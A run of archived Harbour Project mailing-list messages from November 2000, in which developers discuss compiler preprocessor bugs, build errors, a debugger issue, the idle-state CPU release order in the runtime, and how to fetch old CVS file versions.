In-Reply-To: <3A1AB5D6.6B32C2AF@teledetection.fr>
Message-ID: <LOBBKAFMMFGJIKLMEPAKEEELDHAA.ron@profit-master.com>

Fixed.

> Hello Harbour,
> 
> 1) I notice with last cvs (flex version) a parse error 
> during compilation (fine with build 0.35).
> 
>  // (...) 
>  #define FNC_NUM_MOD(n)     aFonc[n][1] 
>  // (...)
>  if FNC_NUM_MOD(nI)[1]==nM-1           // Error here !!!
>  // (...)
> 
> harbour uc.prg /n /p /es2 /IC:\HARBOUR\INCLUDE
> Harbour Compiler 0.35i (Build 35) (2000.10.23)
> Copyright 1999-2000, http://www.harbour-project.org
> Compiling 'uc.prg' and generating preprocessed output to 'uc.ppo'...
> uc.prg(395) Error E0030  Syntax error: "parse error at '1'"
> (...)
> 
> The problem seems to be in the pp here is the line after pp !
> 
>  if aFonc[nI][12]"1"==nM-1


From harbour@lists.harbour-project.org  Tue Nov 21 23:56:02 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Tue Nov 21 23:56:02 2000
Subject: [Harbour] debugger
Message-ID: <000901c05440$626fd430$8604d2cc@san.rr.com>

Has anyone been able to get the debugger  to run under NT?
The programs built with /b just return to the DOS prompt.  I ran it under
TD32 and it does load and seems to go into a loop calling something in
Kernel32,  then just terminates.

Brian Hays
Abacus Data Systems, Inc



From harbour@lists.harbour-project.org  Wed Nov 22 03:36:02 2000
From: harbour@lists.harbour-project.org (Guy Roussin)
Date: Wed Nov 22 03:36:02 2000
Subject: [Harbour] Error with last cvs
References: <LOBBKAFMMFGJIKLMEPAKIEEIDHAA.ron@profit-master.com>
Message-ID: <3A1B852A.635994CA@teledetection.fr>

Ron,

Thank you for your quick answer and fix.
Now, all is fine with simpLex & Flex 

( i have some 'OOps !' during compilation ? )

Guy

Ron Pinkas wrote:
> 
> Guy,
> 
> Thanks for the info, it is a PP problem, and I'll post a fix soon.
> 
> As to your SimpLex build error, you need to issue a B32_SLEX CLEAN first!
> Because harboury.c need to be generated from harbour.sly rather then
> harbour.y.
> 
> Ron
> 
> > Hello Harbour,
> >
> > 1) I notice with last cvs (flex version) a parse error
> > during compilation (fine with build 0.35).
> >
> >  // (...)
> >  #define FNC_NUM_MOD(n)     aFonc[n][1]
> >  // (...)
> >  if FNC_NUM_MOD(nI)[1]==nM-1           // Error here !!!
> >  // (...)
> >
> > harbour uc.prg /n /p /es2 /IC:\HARBOUR\INCLUDE
> > Harbour Compiler 0.35i (Build 35) (2000.10.23)
> > Copyright 1999-2000, http://www.harbour-project.org
> > Compiling 'uc.prg' and generating preprocessed output to 'uc.ppo'...
> > uc.prg(395) Error E0030  Syntax error: "parse error at '1'"
> > (...)
> >
> > The problem seems to be in the pp here is the line after pp !
> >
> >  if aFonc[nI][12]"1"==nM-1
> >
> >
> > 2)
> >
> > I try to compile with slex but i got this log
> > (sorry if i missed something about GET):
> >
> > MAKE Version 5.2  Copyright (c) 1987, 2000 Borland
> >       bcc32 -c -Iinclude;source\compiler;source\macro -d
> > -DHARBOUR_USE_WIN_GTAPI -O2   -Iobj\b32 -oobj\b32\hbslex.obj
> > source\compiler\hbslex.c
> > harbour@lists.harbour-project.orgBorland C++ 5.5 for Win32
> > Copyright (c) 1993, 2000 Borland
> > source\compiler\hbslex.c:
> > Error E2451 source\compiler\harbour.slx 272: Undefined symbol 'GET'
> > Error E2141 source\compiler\harbour.slx 272: Declaration syntax error
> > Error E2190 source\compiler\harbour.slx 272: Unexpected }
> > Error E2190 source\compiler\harbour.slx 272: Unexpected }
> > Error E2190 source\compiler\harbour.slx 273: Unexpected }
> > Error E2109 source\compiler\simplex.c 211: Not an allowed type
> > *** 6 errors in Compile ***
> >
> > ** error 1 ** deleting obj\b32\hbslex.obj
> >
> >
> > Thanks,
> >
> > --
> > Guy Roussin
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
Guy Roussin
UMR Cemagref-ENGREF Structures et Systèmes Spatiaux
Maison de la Télédétection en Languedoc Roussillon
500, rue J.F. Breton
34093 MONTPELLIER Cedex 5

tél: 04.67.54.87.46 fax: 04.67.54.87.00
mailto:guy.roussin@teledetection.fr

From harbour@lists.harbour-project.org  Wed Nov 22 04:47:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Wed Nov 22 04:47:02 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKAEELDHAA.ron@profit-master.com>
Message-ID: <3A1B95DE.6BC8A476@libero.it>

Ron,

looking at hb_idleState more closely it seems to me that hb_releaseCPU()
should be called after s_pIdleTasks have been executed :-)

void hb_idleState( void )
{
   if( ! s_bIamIdle )
   {
      s_bIamIdle = TRUE;
      hb_gcCollectAll();
      hb_releaseCPU();

      if( s_pIdleTasks )
      {
         hb_vmEvalBlock( s_pIdleTasks + s_uiIdleTask );
         if( ++s_uiIdleTask == s_uiIdleMaxTask )
            s_uiIdleTask = 0;
      }
      s_bIamIdle = FALSE;
   }
}

Note also that Sleep(0) din't make any change to the fact that screen
redrawing is _slooooow_ under win32. 

regards,


Ron Pinkas ha scritto:
> 
> 2000-11-21 18:35 UTC+0800 Ron Pinkas <ron@profit-master.com>
>    * source/pp/ppcomp.c
>      * Corrected 1 compiler warning.
> 
>    * source/pp/ppcore.c
>      + Added s_bArray support logic to WorkDefine()
> 
>    * source/rtl/idle.c
>      * Reversed order of hb_gcCollectAll() and hb_releaseCPU();
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Wed Nov 22 05:16:02 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Wed Nov 22 05:16:02 2000
Subject: [Harbour] classes.c error ? (JF)
In-Reply-To: <000901c05440$626fd430$8604d2cc@san.rr.com>
Message-ID: <000601c0546c$fca5cf60$0f2aa8c0@fivetechs>

JF,

I can reproduce this error here sistematically:

Unrecoverable error 9010: hb_xfree called with an invalid pointer
Called from CHILDLEVEL(181)

Any ideas ?

many thanks!

Antonio


From harbour@lists.harbour-project.org  Wed Nov 22 05:23:01 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Wed Nov 22 05:23:01 2000
Subject: [Harbour] classes.c error ? (JF)
In-Reply-To: <000601c0546c$fca5cf60$0f2aa8c0@fivetechs>
Message-ID: <000701c0546d$f9b60d00$0f2aa8c0@fivetechs>

JF,

I missed ChildLevel() source code. It is here:

function ChildLevel( o, oClass )

return If( o:IsDerivedFrom( oClass ), 1, 0 )


Antonio


From harbour@lists.harbour-project.org  Wed Nov 22 05:34:02 2000
From: harbour@lists.harbour-project.org (Antonio Linares)
Date: Wed Nov 22 05:34:02 2000
Subject: [Harbour] classes.c error ? (JF)
In-Reply-To: <000701c0546d$f9b60d00$0f2aa8c0@fivetechs>
Message-ID: <000a01c0546f$7b01ea40$0f2aa8c0@fivetechs>

JF,

If I comment out o:IsDerivedFrom() call, then
there is no error.

So it seems the error is coming from it.

many thanks for your help,

Antonio

From harbour@lists.harbour-project.org  Wed Nov 22 06:08:02 2000
From: harbour@lists.harbour-project.org (harbour@lists.harbour-project.org)
Date: Wed Nov 22 06:08:02 2000
Subject: [Harbour] classes.c error ? (JF)
In-Reply-To: <000a01c0546f$7b01ea40$0f2aa8c0@fivetechs>
References: <000701c0546d$f9b60d00$0f2aa8c0@fivetechs>
Message-ID: <3A1BB306.32028.7A3BC7@localhost>

Hi Antonio

Will have a look asap...

> JF,
> 
> If I comment out o:IsDerivedFrom() call, then
> there is no error.
> 
> So it seems the error is coming from it.
> 
> many thanks for your help,
> 
> Antonio
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org
> 
> 



Best regards,

J. Lefebvre <jflefebv@mafact.com>
Mafact SA/NV
Belgium
(See us at http://www.mafact.com)
jflefebv@mafact.com


From harbour@lists.harbour-project.org  Wed Nov 22 11:00:03 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Wed Nov 22 11:00:03 2000
Subject: [Harbour] Error with last cvs
In-Reply-To: <3A1B852A.635994CA@teledetection.fr>
Message-ID: <LOBBKAFMMFGJIKLMEPAKKEENDHAA.ron@profit-master.com>

Oops, I forgot to remove the debug oops message. Fixed.

> Ron,
> 
> Thank you for your quick answer and fix.
> Now, all is fine with simpLex & Flex 
> 
> ( i have some 'OOps !' during compilation ? )
> 
> Guy


From harbour@lists.harbour-project.org  Wed Nov 22 11:03:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Wed Nov 22 11:03:02 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <3A1B95DE.6BC8A476@libero.it>
Message-ID: <LOBBKAFMMFGJIKLMEPAKOEENDHAA.ron@profit-master.com>

Maurilio,

Yes, I think you are correct. If no one gets to it before I upload next,
I'll commit this change.

Ron

> Ron,
>
> looking at hb_idleState more closely it seems to me that hb_releaseCPU()
> should be called after s_pIdleTasks have been executed :-)
>
> void hb_idleState( void )
> {
>    if( ! s_bIamIdle )
>    {
>       s_bIamIdle = TRUE;
>       hb_gcCollectAll();
>       hb_releaseCPU();
>
>       if( s_pIdleTasks )
>       {
>          hb_vmEvalBlock( s_pIdleTasks + s_uiIdleTask );
>          if( ++s_uiIdleTask == s_uiIdleMaxTask )
>             s_uiIdleTask = 0;
>       }
>       s_bIamIdle = FALSE;
>    }
> }
>
> Note also that Sleep(0) din't make any change to the fact that screen
> redrawing is _slooooow_ under win32.
>
> regards,


From harbour@lists.harbour-project.org  Wed Nov 22 11:55:03 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Wed Nov 22 11:55:03 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKOEENDHAA.ron@profit-master.com>
Message-ID: <3A1BFA26.C8F45E3F@libero.it>

Ron,

the more I think the more I'm convinced that we should make these things
in this order:

are there keys to handle? {
	handle them
} else {
	are there idle tasks to handle {
		handle them
		are there keys to handle? {
			exit 
		} else {
			call releaseCPU	
			}
	} else {
		call releaseCPU()
		}


this is because releaseCPU suspends your program (and under OS/2 it does
not relinquish the rest of current timeslice, but waits 32ms before
being re-executed) so it must be called only when there really is
nothing more to do.

Sorry If I'm changing my mind over and over :-)

PS. There is not linux code here. Nobody knows how to do under Linux? I
think it is important that harbour programs don't hog cpu more than
needed.

regards.

Ron Pinkas ha scritto:
> 
> Maurilio,
> 
> Yes, I think you are correct. If no one gets to it before I upload next,
> I'll commit this change.
> 
> Ron
> 
> > Ron,
> >
> > looking at hb_idleState more closely it seems to me that hb_releaseCPU()
> > should be called after s_pIdleTasks have been executed :-)
> >
> > void hb_idleState( void )
> > {
> >    if( ! s_bIamIdle )
> >    {
> >       s_bIamIdle = TRUE;
> >       hb_gcCollectAll();
> >       hb_releaseCPU();
> >
> >       if( s_pIdleTasks )
> >       {
> >          hb_vmEvalBlock( s_pIdleTasks + s_uiIdleTask );
> >          if( ++s_uiIdleTask == s_uiIdleMaxTask )
> >             s_uiIdleTask = 0;
> >       }
> >       s_bIamIdle = FALSE;
> >    }
> > }
> >
> > Note also that Sleep(0) din't make any change to the fact that screen
> > redrawing is _slooooow_ under win32.
> >
> > regards,
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Wed Nov 22 12:09:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Wed Nov 22 12:09:02 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <3A1BFA26.C8F45E3F@libero.it>
Message-ID: <LOBBKAFMMFGJIKLMEPAKMEEODHAA.ron@profit-master.com>

Maurilio,

Makes sense. I had similar thought myself. David? Ryszard? Victor? Antonio?

Ron

> Ron,
> 
> the more I think the more I'm convinced that we should make these things
> in this order:
> 
> are there keys to handle? {
> 	handle them
> } else {
> 	are there idle tasks to handle {
> 		handle them
> 		are there keys to handle? {
> 			exit 
> 		} else {
> 			call releaseCPU	
> 			}
> 	} else {
> 		call releaseCPU()
> 		}
> 
> 
> this is because releaseCPU suspends your program (and under OS/2 it does
> not relinquish the rest of current timeslice, but waits 32ms before
> being re-executed) so it must be called only when there really is
> nothing more to do.
> 
> Sorry If I'm changing my mind over and over :-)
> 
> PS. There is not linux code here. Nobody knows how to do under Linux? I
> think it is important that harbour programs don't hog cpu more than
> needed.
> 
> regards.


From harbour@lists.harbour-project.org  Wed Nov 22 12:39:02 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Wed Nov 22 12:39:02 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <LOBBKAFMMFGJIKLMEPAKMEEODHAA.ron@profit-master.com>
References: <3A1BFA26.C8F45E3F@libero.it>
Message-ID: <200011221738.eAMHcHG01165@thor.parrett.net>

** Reply to message from "Ron Pinkas" <ron@profit-master.com> on Wed,
22 Nov 2000 09:10:11 -0800

> Makes sense. I had similar thought myself. David? ...

Sounds OK to me.
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Wed Nov 22 12:44:02 2000
From: harbour@lists.harbour-project.org (rglab)
Date: Wed Nov 22 12:44:02 2000
Subject: [Harbour] lookup still becomes undefined
References: <003d01c052d8$bd0ca530$8604d2cc@san.rr.com>
Message-ID: <3A1C06EE.CE4D581F@imid.med.pl>

Brian Hays wrote:

> I got the latest changes and did a clean rebuild.
> My LookUp() function still is callable from anywhere in the large app, but
> cannot be found when in a macro expression.

  Can you dump the dynamic symbols table before and after macro
evaluation using __dynsGetName()?
(see tests/dynsym.prg for detailed usage)

Regards, Ryszard

From harbour@lists.harbour-project.org  Wed Nov 22 12:57:01 2000
From: harbour@lists.harbour-project.org (Ryszard Glab)
Date: Wed Nov 22 12:57:01 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas  <ron@profit-master.com>
In-Reply-To: <3A1BFA26.C8F45E3F@libero.it>
Message-ID: <3A1C17EA.426.510314@localhost>

On 22 Nov 2000, at 17:53, Maurilio Longo wrote:

> the more I think the more I'm convinced that we should make these
> things in this order:

  I think that the order of functions calling is not important at 
all. See a code in rtl/inkey.c which calls hb_idleState(). 
hb_idleSate() is called when INKEY(0) or INKEY( nonzerovalue ) is 
called which means that the application is suspended regardless of 
hb_releaseCPU(). On the other hand if INKEY() is called with no 
parameters than hb_idleState() is not called and hb_releaseCPU() is 
not called too. So we should eventually rethink if hb_releaseCPU() 
should be called separately in this case or we should add some 
harbour level wrapper function that should be called depending on an 
application requirements.

Regards, Ryszard

From harbour@lists.harbour-project.org  Wed Nov 22 13:17:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Wed Nov 22 13:17:02 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <3A1C17EA.426.510314@localhost>
Message-ID: <3A1C0D66.D8D8F88C@libero.it>

Ryszard,

the order of calls is very important!

If you have inkey() in your code you don't want to be blocked (and
harbour vm should not call releaseCPU()) but if you have inkey(0) or
inkey(somevalue) you should block until a key comes in or that somevalue
has expired.

Note that harbour level "your application is suspended" is different
from OS level. That is, harbour level code could be blocked at an
inkey(0) statement but harbour vm could be executing something (like gc
or idle tasks).

We need that harbour vm blocks itself where there is nothing to execute
at the vm level as not to hog cpu on an active wait (polling) which
simply wastes cpu cycles and makes the rest of your tasks slow down
without need.

At the same time harbour vm should not relinquish its slice of cpu time
if it has something to do because this would slow down your harbour
program without need.

regards.

PS. Note that an idle task which makes any I/O will surely make your
program block itself (relinquishing cpu) somewhere waiting for that I/O
to finish (at least on Linux - OS/2 - WinNt/2K).


Ryszard Glab ha scritto:
> 
> On 22 Nov 2000, at 17:53, Maurilio Longo wrote:
> 
> > the more I think the more I'm convinced that we should make these
> > things in this order:
> 
>   I think that the order of functions calling is not important at
> all. See a code in rtl/inkey.c which calls hb_idleState().
> hb_idleSate() is called when INKEY(0) or INKEY( nonzerovalue ) is
> called which means that the application is suspended regardless of
> hb_releaseCPU(). On the other hand if INKEY() is called with no
> parameters than hb_idleState() is not called and hb_releaseCPU() is
> not called too. So we should eventually rethink if hb_releaseCPU()
> should be called separately in this case or we should add some
> harbour level wrapper function that should be called depending on an
> application requirements.
> 
> Regards, Ryszard
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 
 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Wed Nov 22 13:35:03 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Wed Nov 22 13:35:03 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKMEEODHAA.ron@profit-master.com>
Message-ID: <02c601c054b3$2d1c6a50$0a0ac8c8@VECWS1>

Maurilio,

Does this mean that releaseCPU() will not be called at all, if there're 
_any_ idle tasks to handle ? If this is the case, it's a problem.

Victor Szakats

> > the more I think the more I'm convinced that we should make these things
> > in this order:
> > 
> > are there keys to handle? {
> > handle them
> > } else {
> > are there idle tasks to handle {
> > handle them
> > are there keys to handle? {
> > exit 
> > } else {
> > call releaseCPU 
> > }
> > } else {
> > call releaseCPU()
> > }



From harbour@lists.harbour-project.org  Wed Nov 22 14:19:02 2000
From: harbour@lists.harbour-project.org (Brian Hays)
Date: Wed Nov 22 14:19:02 2000
Subject: [Harbour] lookup still becomes undefined
References: <003d01c052d8$bd0ca530$8604d2cc@san.rr.com> <3A1C06EE.CE4D581F@imid.med.pl>
Message-ID: <006a01c054b8$efedd230$8604d2cc@san.rr.com>

Ryszard:

I tested it again to set up the dump, and lo and behold the problem was
fixed.
I had done a pretty careful clean rebuild with both lexers, but apparently I
must have slipped somewhere.
The only thing I hadn't rebuilt was rdd_ads, so perhaps that affected
things??

At any rate, I have 3,415 well-sorted non-duped well-behaved symbols,
including LookUp.
Thanks again!

Brian Hays
Abacus Data Systems, Inc



From harbour@lists.harbour-project.org  Wed Nov 22 17:45:02 2000
From: harbour@lists.harbour-project.org (Nelson Bertolino Junior)
Date: Wed Nov 22 17:45:02 2000
Subject: [Harbour] Harbour been cracked?
References: <004d01c05278$2899dfe0$0100007f@sl.conex.net> <3A19A0EC.2050100@upol.com.br> <20001121073416.B29496@hagbard.davep.org>
Message-ID: <3A1C4C98.9080201@upol.com.br>

Dave, you are completely right.

I'm really sorry for my comment about this subject. It was stupid.

Nelson

Dave Pearson wrote:

> [Quotes rearranged to have a more logical flow]
> 
> On Mon, Nov 20, 2000 at 08:08:44PM -0200, Nelson Bertolino Junior wrote:
> 
> 
>> Luiz Rafael Culik Guimaraes wrote:
>> 
>> 
>>> After 3 years developing and implemented solutions ERP wi FW, the
>>> Microsiga Company(It an Brazilian Software House) has internaly
>>> developed( or adapted from the Harbour) with a cost aproximadally US $ 2
>>> million an 64 bit compiler ( I dont belive in this number,32 can be)
>>> called advPL, or Protheus. It generate an P-Code in C++ that is compiled
>>> with Borland C++ 5.0. It surely that can be compiled under Linux,Solaris
>>> and other platforms. It doesnt sound that you know.
>> 
>> I've never knew anything about this, but considering the source
>> (MICROSIGA), it could be true. They are a little bit dangerous ...
> 
> Please choose your words wisely. There's nothing in the above that actually
> says that the product in question is in any way related to harbour (for
> starters, it says they've been developing for three years, harbour is only
> half that age) and simply saying that it "could be true" because a company
> is a "little but dangerous" doesn't help at all.
> 
> All you're doing here is turning the rumour mill. This isn't helpful to
> harbour, quite the opposite in fact.
> 
> If someone has facts, they should post them. If someone has rumour they
> should convert them into facts or not post them at all (and they should
> possibly consider apologising to the company in question if the rumour isn't
> convertible into a fact).
> 


From harbour@lists.harbour-project.org  Wed Nov 22 17:49:02 2000
From: harbour@lists.harbour-project.org (John Skelton)
Date: Wed Nov 22 17:49:02 2000
Subject: [Harbour] getting old CVS snapshots
Message-ID: <200011221748_MC2-BBD1-BEE7@compuserve.com>

[To All]

Can I fetch a CVS as it was (say) 3 weeks ago?  How? :-)

Something changed a while ago and I'd like to try to figure out when,
and thus which change(s) may be behind it.

If the details are in cvs.html please tell me the part concerned. :-)

John.

From harbour@lists.harbour-project.org  Wed Nov 22 18:07:02 2000
From: harbour@lists.harbour-project.org (Luiz Rafael Culik Guimaraes)
Date: Wed Nov 22 18:07:02 2000
Subject: [Harbour] Harbour and makeFiles(Borland)
Message-ID: <001e01c054d8$e8d339c0$0100007f@sl.conex.net>

Dear friends

Some Brazilian user has request to me an harbour utility to create
Makefiles.

I´ll create an hbmake file that take files need to create , additional
libraries. and them create an Borland Style makefile

That do you think

Regards from Brazil

Luiz Rafael Culik


From harbour@lists.harbour-project.org  Wed Nov 22 18:15:04 2000
From: harbour@lists.harbour-project.org (David G. Holm)
Date: Wed Nov 22 18:15:04 2000
Subject: [Harbour] getting old CVS snapshots
In-Reply-To: <200011221748_MC2-BBD1-BEE7@compuserve.com>
Message-ID: <200011222314.eAMNEvG27628@thor.parrett.net>

** Reply to message from John Skelton <John_Skelton@compuserve.com> on
Wed, 22 Nov 2000 17:47:46 -0500

> Can I fetch a CVS as it was (say) 3 weeks ago?  How? :-)

Not easily, because the CVS rarely gets tagged unless an official build
has just been released or a major change is about to be done. But if you
want a specific version of a specific file, then you can run 'cvs log
filename' to see the history for that file to determine which version to
get, then use 'cvs update -p -r version filename > newfilename'. If you
don't use -p and > newfilename, then the -r version will become "sticky"
which can have dire consequences should you forget to use the -A option
the next time you run a CVS command. You can run 'cvs update --help' for
a complete list of options (for instance, you can use '-date date'
instead of '-r version').
-- 
David G. Holm, Set Captain and all around
Harbour Project Clipper Compatibility fanatic.

From harbour@lists.harbour-project.org  Wed Nov 22 18:18:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Wed Nov 22 18:18:02 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas <ron@profit-master.com>
In-Reply-To: <02c601c054b3$2d1c6a50$0a0ac8c8@VECWS1>
Message-ID: <LOBBKAFMMFGJIKLMEPAKCEFBDHAA.ron@profit-master.com>

Victor,

No, it just means that ReleaseCPU() will be called *after* such tasks have
been completed and the VM is still in IDLE mode.

I believe this is the correct behavior, after all, why should we release
(our slice of) the CPU, if we have pending tasks to complete? In such cases
we are not really IDLE yet.

Ron

> Maurilio,
>
> Does this mean that releaseCPU() will not be called at all, if there're
> _any_ idle tasks to handle ? If this is the case, it's a problem.
>
> Victor Szakats
>
> > > the more I think the more I'm convinced that we should make
> these things
> > > in this order:
> > >
> > > are there keys to handle? {
> > > handle them
> > > } else {
> > > are there idle tasks to handle {
> > > handle them
> > > are there keys to handle? {
> > > exit
> > > } else {
> > > call releaseCPU
> > > }
> > > } else {
> > > call releaseCPU()
> > > }


From harbour@lists.harbour-project.org  Wed Nov 22 18:42:02 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Wed Nov 22 18:42:02 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas  <ron@profit-master.com>
In-Reply-To: <3A1C17EA.426.510314@localhost>
Message-ID: <LOBBKAFMMFGJIKLMEPAKOEFBDHAA.ron@profit-master.com>

Ryszard,

Once we do enter an IDLE mode, where ReleaseCPU() is a _candidate_, it makes
no sense to release the CPU *before* we complete pending tasks!

Therefore, the order of the functions calls *is* indeed very important. We
should *not* release Harbour Application's time slice, until _when_and_if_
we completed all pending tasks. Then if the application is still IDLE, and
we have *no* further use for our remaining time slice (until we get the
desired I/O input), we should release the CPU.

Ron

> > the more I think the more I'm convinced that we should make these
> > things in this order:
>
>   I think that the order of functions calling is not important at
> all. See a code in rtl/inkey.c which calls hb_idleState().
> hb_idleSate() is called when INKEY(0) or INKEY( nonzerovalue ) is
> called which means that the application is suspended regardless of
> hb_releaseCPU(). On the other hand if INKEY() is called with no
> parameters than hb_idleState() is not called and hb_releaseCPU() is
> not called too. So we should eventually rethink if hb_releaseCPU()
> should be called separately in this case or we should add some
> harbour level wrapper function that should be called depending on an
> application requirements.
>
> Regards, Ryszard


From harbour@lists.harbour-project.org  Wed Nov 22 18:43:03 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Wed Nov 22 18:43:03 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKCEFBDHAA.ron@profit-master.com>
Message-ID: <3A1C59C9.7ABEC8BE@libero.it>

Yes Ron,

this is what I consider the correct behaviour.

regards.

Ron Pinkas ha scritto:
> 
> Victor,
> 
> No, it just means that ReleaseCPU() will be called *after* such tasks have
> been completed and the VM is still in IDLE mode.
> 
> I believe this is the correct behavior, after all, why should we release
> (our slice of) the CPU, if we have pending tasks to complete? In such cases
> we are not really IDLE yet.
> 
> Ron
> 
> > Maurilio,
> >
> > Does this mean that releaseCPU() will not be called at all, if there're
> > _any_ idle tasks to handle ? If this is the case, it's a problem.
> >
> > Victor Szakats
> >
> > > > the more I think the more I'm convinced that we should make
> > these things
> > > > in this order:
> > > >
> > > > are there keys to handle? {
> > > > handle them
> > > > } else {
> > > > are there idle tasks to handle {
> > > > handle them
> > > > are there keys to handle? {
> > > > exit
> > > > } else {
> > > > call releaseCPU
> > > > }
> > > > } else {
> > > > call releaseCPU()
> > > > }
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Wed Nov 22 18:46:02 2000
From: harbour@lists.harbour-project.org (Maurilio Longo)
Date: Wed Nov 22 18:46:02 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas
 <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKMEEODHAA.ron@profit-master.com> <02c601c054b3$2d1c6a50$0a0ac8c8@VECWS1>
Message-ID: <3A1C5A7E.6D0FACA4@libero.it>

Victor,

it is not a problem since our task will be preempted as soon as its
slice of cpu time ends or it starts any I/O operation.

We have to release cpu _only_ when we don't have anything to do and not
from time to time.

regards.

Victor Szakats ha scritto:
> 
> Maurilio,
> 
> Does this mean that releaseCPU() will not be called at all, if there're
> _any_ idle tasks to handle ? If this is the case, it's a problem.
> 
> Victor Szakats
> 
> > > the more I think the more I'm convinced that we should make these things
> > > in this order:
> > >
> > > are there keys to handle? {
> > > handle them
> > > } else {
> > > are there idle tasks to handle {
> > > handle them
> > > are there keys to handle? {
> > > exit
> > > } else {
> > > call releaseCPU
> > > }
> > > } else {
> > > call releaseCPU()
> > > }
> 
> _______________________________________________
> Harbour mailing list
> Harbour@lists.harbour-project.org
> http://www.matrixlist.com/mailman/listinfo/harbour
> 
> Thank you for participating in The Harbour Project.  Be sure to check
> http://www.Harbour-Project.org

-- 

 __________                   
|  |  | |__| md2520@mclink.it 
|_|_|_|____| Team OS/2 Italia

From harbour@lists.harbour-project.org  Wed Nov 22 18:53:01 2000
From: harbour@lists.harbour-project.org (Ron Pinkas)
Date: Wed Nov 22 18:53:01 2000
Subject: [Harbour] getting old CVS snapshots
In-Reply-To: <200011221748_MC2-BBD1-BEE7@compuserve.com>
Message-ID: <LOBBKAFMMFGJIKLMEPAKEEFCDHAA.ron@profit-master.com>

John,

When I had similar need, I found that easiest way to track and review such
changes is through the www.SourceForge.net web site.

SourceForge allows you to navigate the CVS tree in your browser. Once
selecting any file, you may review the list of (and download) all past
versions of the file. Further, you may click a "diff" button to review the
diff of that version and any other version of that file.

Hope it helps.

Ron

> [To All]
>
> Can I fetch a CVS as it was (say) 3 weeks ago?  How? :-)
>
> Something changed a while ago and I'd like to try to figure out when,
> and thus which change(s) may be behind it.
>
> If the details are in cvs.html please tell me the part concerned. :-)
>
> John.


From harbour@lists.harbour-project.org  Wed Nov 22 19:42:02 2000
From: harbour@lists.harbour-project.org (Victor Szakats)
Date: Wed Nov 22 19:42:02 2000
Subject: [Harbour] 2000-11-21 18:35 UTC+0800 Ron Pinkas  <ron@profit-master.com>
References: <LOBBKAFMMFGJIKLMEPAKMEEODHAA.ron@profit-master.com> <02c601c054b3$2d1c6a50$0a0ac8c8@VECWS1> <3A1C5A7E.6D0FACA4@libero.it>
Message-ID: <030201c054e5$43f33470$0a0ac8c8@VECWS1>

Maurilio, Ron,


> it is not a problem since our task will be preempted as soon as its
> slice of cpu time ends or it starts any I/O operation.
> 
> We have to release cpu _only_ when we don't have anything to do and not
> from time to time.

I think we should release CPU when we want to let the OS run itself and its 
